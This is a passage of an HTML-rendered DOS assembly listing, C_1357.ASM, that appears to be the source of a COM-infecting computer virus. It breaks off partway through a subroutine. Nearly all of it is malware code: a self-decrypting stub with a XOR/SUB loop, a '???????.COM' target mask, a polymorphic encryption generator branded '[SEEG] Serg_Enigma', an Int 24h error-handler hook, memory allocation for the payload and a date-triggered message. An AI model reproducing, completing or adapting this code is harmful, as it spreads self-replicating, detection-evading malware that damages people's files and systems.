<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>C_1357.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">    </span><span class="sc9">.MODEL</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
    </span><span class="sc2">.186</span><span class="sc0">
    </span><span class="sc9">.code</span><span class="sc0"> 
    </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">sc</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">200d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">08h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">sc</span><span class="sc0">     </span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">     </span><span class="sc1">;--- Mov {BX} {SI} {DI},START_DECODING  YYY</span><span class="sc0">
</span><span class="sc5">decod</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">     </span><span class="sc1">;\                                      YYY</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">     </span><span class="sc1">; \                                     YYY</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">     </span><span class="sc1">;  \                                    YYY</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">     </span><span class="sc1">;   \___DECODER                         YYY</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">     </span><span class="sc1">;   /                                   YYY</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">     </span><span class="sc1">;  /                                    YYY</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">     </span><span class="sc1">; /                                     YYY</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">     </span><span class="sc1">;/                                      YYY</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc0">             </span><span class="sc1">;-- INC {BX} {SI} {DI}                  Y</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0"> </span><span class="sc1">;-- CMP {BX} {SI} {DI},END_DECODING     NYYY</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">         </span><span class="sc1">;-- JB  DECOD                           NY</span><span class="sc0">
</span><span class="sc5">Virn</span><span class="sc0">    </span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">  </span><span class="sc1">;--- KEY </span><span class="sc0">
</span><span class="sc5">Virt</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;   clc</span><span class="sc0">
</span><span class="sc1">;   cld</span><span class="sc0">
</span><span class="sc1">;   Push    Cs</span><span class="sc0">
</span><span class="sc1">;   Pop     Ss</span><span class="sc0">
</span><span class="sc1">;   Pushf</span><span class="sc0">
</span><span class="sc1">;   Mov     Di,Sp</span><span class="sc0">
</span><span class="sc1">;   Mov     Bx,[Di] </span><span class="sc0">
</span><span class="sc1">;   Lahf</span><span class="sc0">
</span><span class="sc1">;   Sub     Bx,Ax</span><span class="sc0">
</span><span class="sc1">;   Xchg    Ax,Bx</span><span class="sc0">
</span><span class="sc1">;   Xor     Al,Al</span><span class="sc0">
</span><span class="sc1">;   Sub     Ah,70h</span><span class="sc0">
</span><span class="sc1">;   Push    100h</span><span class="sc0">
</span><span class="sc1">;   Xchg    Al,Ah</span><span class="sc0">
</span><span class="sc1">;   Mov     Cx,4</span><span class="sc0">
</span><span class="sc1">;   Push    Dx</span><span class="sc0">
</span><span class="sc1">;   Mul     Cx</span><span class="sc0">
</span><span class="sc1">;   Pop     Dx</span><span class="sc0">
</span><span class="sc1">;   Sub     Di,Ax</span><span class="sc0">
</span><span class="sc1">;   Mov     Ax,[Di]</span><span class="sc0">
</span><span class="sc1">;   Sub     Ah,72h</span><span class="sc0">
</span><span class="sc1">;   Xor     Al,Al</span><span class="sc0">
</span><span class="sc1">;   Add     Dx,Ax</span><span class="sc0">
</span><span class="sc1">;   Pop     Ax</span><span class="sc0">
</span><span class="sc1">;   Pop     Ax</span><span class="sc0">
</span><span class="sc5">Virn</span><span class="sc0">    </span><span class="sc9">ENDP</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">opt</span><span class="sc0">
</span><span class="sc5">opt</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Bp</span><span class="sc0">
    </span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc8">Bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">opt</span><span class="sc0">
</span><span class="sc5">Cycl</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">vir</span><span class="sc4">+[</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">lng</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc2">2d</span><span class="sc0">
</span><span class="sc5">crypt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">],</span><span class="sc8">Dx</span><span class="sc0">
    </span><span class="sc6">Inc</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc2">0deadh</span><span class="sc0">
    </span><span class="sc6">Inc</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">crypt</span><span class="sc0">
</span><span class="sc1">;   Cmp word ptr vir+[Bp],'?\'</span><span class="sc0">
</span><span class="sc1">;   Jz  dr</span><span class="sc0">
</span><span class="sc1">;   Inc Dh</span><span class="sc0">
</span><span class="sc1">;   Jmp Cycl</span><span class="sc0">
</span><span class="sc1">;dr:</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">late</span><span class="sc0">

</span><span class="sc5">vir</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"\???????.COM"</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
</span><span class="sc5">des</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"000000000000000000000"</span><span class="sc0"> </span><span class="sc1">;00h</span><span class="sc0">
</span><span class="sc5">atrib</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"0"</span><span class="sc0">         </span><span class="sc1">;15h</span><span class="sc0">
</span><span class="sc5">time</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"00"</span><span class="sc0">            </span><span class="sc1">;16h</span><span class="sc0">
</span><span class="sc5">date</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"00"</span><span class="sc0">            </span><span class="sc1">;18h</span><span class="sc0">
</span><span class="sc5">dlina</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"0000"</span><span class="sc0">          </span><span class="sc1">;1Ah</span><span class="sc0">
</span><span class="sc5">new_f</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"000000000000"</span><span class="sc0">      </span><span class="sc1">;1Eh</span><span class="sc0">
</span><span class="sc5">new_j</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"щ00"</span><span class="sc0">
</span><span class="sc5">buf_j</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"═ Р"</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">tabl</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">052h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0fch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05ah</span><span class="sc0"> </span><span class="sc1">;\     Nop</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0f6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">017h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">090h</span><span class="sc0"> </span><span class="sc1">; \    Not b,[??]  +</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">037h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0"> </span><span class="sc1">;  \   Xor b,[??],K1   +   Key#-</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0"> </span><span class="sc1">;   \  Rol b,[??],K2   +   Key\_</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0"> </span><span class="sc1">;    \ Ror b,[??],K2   +   Key/</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0f6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">090h</span><span class="sc0"> </span><span class="sc1">;    / Neg b,[??]  +</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0"> </span><span class="sc1">;   /  Add b,[??],K3   +   Key\_</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0"> </span><span class="sc1">;  /   Sub b,[??],K3   +   Key/</span><span class="sc0">
</span><span class="sc1">;----------------------------------/</span><span class="sc0">
</span><span class="sc5">M1</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">    </span><span class="sc1">;---- [ MOV BX,xxxx ]</span><span class="sc0">
</span><span class="sc5">I1</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">043h</span><span class="sc0">            </span><span class="sc1">;---- [ INC BX ]</span><span class="sc0">
</span><span class="sc5">COM</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0fbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">   </span><span class="sc1">;---- [ CMP xx,xxxx ]   +</span><span class="sc0">
</span><span class="sc5">J1</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e1h</span><span class="sc0">          </span><span class="sc1">;---- [ JB xx ] e1 - 8</span><span class="sc0">
</span><span class="sc5">Gat</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1eh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">06h</span><span class="sc0">
</span><span class="sc5">der</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1fh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0cbh</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Cop</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc3">"-= [SEEG] Serg_Enigma EncryptioN GeneratoR v0.01 =-"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc3">"$"</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">one</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">;\
    db      00h  ; \     </span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">;  \
    db      00h  ;   \___{ Комбинация комманд для за/разшифровщика</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">;   /</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">;  /</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">;/</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">dir</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">cody</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0fdh</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
</span><span class="sc5">seg_new</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">b_reg</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">n_com</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">d_dlina</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">vec24</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">late</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc5">buf_j</span><span class="sc4">+[</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">
    </span><span class="sc6">Movsb</span><span class="sc0">
    </span><span class="sc6">Movsw</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">dir</span><span class="sc4">+[</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Es</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Set_Int_24</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Es</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4900h</span><span class="sc0">
    </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">Jc</span><span class="sc0">  </span><span class="sc5">rt</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4800h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc0">
    </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc2">70h</span><span class="sc0"> </span><span class="sc1">;-------\
    Jc  rt</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4a00h</span><span class="sc0">
    </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4800h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc2">6fh</span><span class="sc0">
    </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">Jc</span><span class="sc0">  </span><span class="sc5">Rt</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">seg_new</span><span class="sc4">],</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Es</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc8">Di</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc2">6e0h</span><span class="sc0">
    </span><span class="sc6">Rep</span><span class="sc0"> </span><span class="sc6">Stosb</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">
    </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Dh</span><span class="sc4">,</span><span class="sc2">22h</span><span class="sc0">
    </span><span class="sc6">Jnz</span><span class="sc0"> </span><span class="sc5">drop</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Mes</span><span class="sc0">
</span><span class="sc5">drop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">gkey</span><span class="sc0">  </span><span class="sc1">;Процедура генерации 3-ех ключей и занесения их в таблицу</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc5">one</span><span class="sc4">+[</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Dx</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0">     </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">rand</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">1234h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rand</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc8">Ah</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Bl</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
    </span><span class="sc6">Div</span><span class="sc0"> </span><span class="sc8">Bl</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc8">Ah</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Bp</span><span class="sc4">]+</span><span class="sc5">b_reg</span><span class="sc4">,</span><span class="sc8">Al</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc5">tabl</span><span class="sc4">+[</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">mreg</span><span class="sc0">    </span><span class="sc1">; Процедура иэменения базовых регистров в таблице</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">01</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">Jnz</span><span class="sc0"> </span><span class="sc5">no</span><span class="sc0">
    </span><span class="sc6">Inc</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc0">
</span><span class="sc5">no</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">Jnz</span><span class="sc0"> </span><span class="sc5">mo</span><span class="sc0">
    </span><span class="sc6">Inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">mo</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc8">Ah</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Bl</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
    </span><span class="sc6">Div</span><span class="sc0"> </span><span class="sc8">Bl</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc8">Ah</span><span class="sc0">
    </span><span class="sc6">Inc</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">n_com</span><span class="sc4">],</span><span class="sc8">Al</span><span class="sc0">
    </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">seg_new</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Es</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Ch</span><span class="sc4">,</span><span class="sc8">Ch</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc2">24d</span><span class="sc0">
</span><span class="sc5">Cycle</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Comp</span><span class="sc0">    </span><span class="sc1">; Генерация последовательности команд</span><span class="sc0">
    </span><span class="sc6">Inc</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">Add</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">
    </span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">
    </span><span class="sc6">Loop</span><span class="sc0">    </span><span class="sc5">Cycle</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Cs</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Es</span><span class="sc0">
    </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">Virus</span><span class="sc0">
</span><span class="sc1">;------ Подпрограммы ----------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Comp</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">Jnz</span><span class="sc0">     </span><span class="sc5">Set_0</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">00d</span><span class="sc0">  
    </span><span class="sc6">Jmp</span><span class="sc0">     </span><span class="sc5">vit</span><span class="sc0">
